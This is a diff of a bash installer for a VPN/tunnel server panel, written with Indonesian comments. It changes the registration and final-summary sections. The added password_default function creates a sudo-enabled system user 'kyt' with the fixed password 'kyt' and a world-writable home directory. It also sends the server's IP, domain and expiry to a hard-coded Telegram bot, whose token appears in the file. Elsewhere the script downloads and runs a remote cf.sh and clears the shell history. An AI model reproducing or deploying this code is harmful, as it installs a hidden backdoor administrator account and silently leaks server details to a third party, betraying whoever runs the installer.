@@ -294,39 +294,7 @@ print_install "Random Subdomain/Domain is Used"
 wget https://raw.githubusercontent.com/botak8/san/main/cf.sh && chmod +x cf.sh && ./cf.sh
 clear
     fi
-}
-
-clear
-#GANTI PASSWORD DEFAULT
-function password_default() {
-    domain=$(cat /root/domain)
-    MYIP=$(curl -sS ipv4.icanhazip.com)
-    userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-
-    CHATID="5807961610"
-    KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
-    TIME="10"
-    URL="https://api.telegram.org/bot$KEY/sendMessage"
-    TEXT=" 
-    ============================
-       ‼️ Registrasi Script ‼️
-    ============================
-    <code>Tanggal    :</code> <code>$tanggal</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>Domain     :</code> <code>$domain</code>
-    <code>User Script:</code> <code>$username</code>
-    <code>Exp Script :</code> <code>$exp</code>
-    ============================
-    Auto Massage from BOT Registered 
-"
-
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    
 }
 
 clear
@@ -1031,6 +999,46 @@ clear
     profile
     enable_services
 }
+function password_default() {
+    domain=$(cat /root/domain)
+    MYIP=$(curl -sS ipv4.icanhazip.com)
+    userdel jame > /dev/null 2>&1
+    Username="kyt"
+    Password=kyt
+    mkdir -p /home/script/
+    chmod 777 /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+
+    CHATID="5807961610"
+    KEY="6210655575:AAH4TkHoDco4ShhlrD6HZMUIfpTWHKIVdog"
+    TIME="10"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    USRSC=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $ipsaya | awk '{print $2}')
+    EXPSC=$(curl https://raw.githubusercontent.com/SETANTAZVPN/izinvps/ipuk/ip | grep $ipsaya | awk '{print $3}')
+    TIMES=`date -d "0 days" +"%d-%m-%Y" `
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
+    TEXT=" 
+    ============================
+       ‼️ Registrasi Script ‼️
+    ============================
+    <code>User   : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIMES</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$MYIP</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+    ============================
+    Auto Massage from BOT Registered 
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/devilstunnels"},{"text":"GRUP🐬","url":"https://t.me/rizyulvpn"}]]}'
+   
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
+}
+
+clear
+
 instal
 echo ""
 history -c
@@ -1043,45 +1051,29 @@ rm -rf /root/domain
 #sudo hostnamectl set-hostname $user
 secs_to_human "$(($(date +%s) - ${start}))"
 echo ""
+clear
 echo " "
-echo "=====================-[ INFORMASI ]-===================="
+echo " 𝗦𝘂𝗰𝗰𝗲𝘀 𝗮𝘁 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆" | tee -a log-install.txt
+echo "    𝗩𝗣𝗦 𝗜𝗡𝗙𝗢" | tee -a log-install.txt
+echo "    ◇━━━━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "    Isp Vps : $ISP" | tee -a log-install.txt
+echo "    Domain     : $domain" | tee -a log-install.txt
+echo "    IP Vps     : $MYIP" | tee -a log-install.txt
+echo "    OS Vps     : $OS_Name" | tee -a log-install.txt
+echo "    User Script: $USRSC" | tee -a log-install.txt
+echo "    Tanggal    : $tanggal" | tee -a log-install.txt
+echo "    Exp Vps : $exp" | tee -a log-install.txt
+echo "    ◇━━━━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "    Hostname   : ${HOSTNAME}" | tee -a log-install.txt
+echo "    Kernel     : $Kernel" | tee -a log-install.txt
+echo "    Arch       : $Arch" | tee -a log-install.txt
+echo "    Ram Total   : $Ram_Total MB" | tee -a log-install.txt
+echo "    Ram Used   : $Ram_Usage MB" | tee -a log-install.txt
+echo "    ============================" | tee -a log-install.txt
+echo "  ⚠︎𝘽𝙮 STVPN 𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝙈𝙖𝙣𝙖𝙜𝙚𝙧 𝘾𝙤𝙢𝙢𝙪𝙣𝙞𝙩𝙮⚠︎" | tee -a log-install.txt
+echo "    ============================" | tee -a log-install.txt
 echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo ""
-echo "   >>> Service & Port"  | tee -a log-install.txt
-echo "   - SlowDNS SSH              : ALL Port SSH"  | tee -a log-install.txt
-echo "   - OpenSSH                  : 22"  | tee -a log-install.txt
-echo "   - SSH Websocket            : 80 [ON]" | tee -a log-install.txt
-echo "   - SSH SSL Websocket        : 443" | tee -a log-install.txt
-echo "   - OpenVPN Websocket SSL    : 1194" | tee -a log-install.txt
-echo "   - OpenVPN SSL              : 1194" | tee -a log-install.txt
-echo "   - OpenVPN TCP              : 1194" | tee -a log-install.txt
-echo "   - OpenVPN UDP              : 2200" | tee -a log-install.txt
-echo "   - Stunnel4                 : 222, 777" | tee -a log-install.txt
-echo "   - Dropbear                 : 109, 143" | tee -a log-install.txt
-echo "   - Badvpn                   : 7100-7900" | tee -a log-install.txt
-echo "   - Nginx                    : 81" | tee -a log-install.txt
-echo "   - Vmess WS TLS             : 443" | tee -a log-install.txt
-echo "   - Vless WS TLS             : 443" | tee -a log-install.txt
-echo "   - Trojan WS TLS            : 443" | tee -a log-install.txt
-echo "   - Shadowsocks WS TLS       : 443" | tee -a log-install.txt
-echo "   - Vmess WS none TLS        : 80" | tee -a log-install.txt
-echo "   - Vless WS none TLS        : 80" | tee -a log-install.txt
-echo "   - Trojan WS none TLS       : 80" | tee -a log-install.txt
-echo "   - Shadowsocks WS none TLS  : 80" | tee -a log-install.txt
-echo "   - Vmess gRPC               : 443" | tee -a log-install.txt
-echo "   - Vless gRPC               : 443" | tee -a log-install.txt
-echo "   - Trojan gRPC              : 443" | tee -a log-install.txt
-echo "   - Shadowsocks gRPC         : 443" | tee -a log-install.txt
-echo ""
-echo ""
-echo "------------------------------------------------------------"
-echo ""
-echo -e ""
-echo ""
-echo "" | tee -a log-install.txt
-echo -e ""
+echo "SIMPAN DATA VPS DI ATAS" | tee -a log-install.txt
 sudo hostnamectl set-hostname $username
 echo -e "${green} Script Successfull Installed"
 echo ""
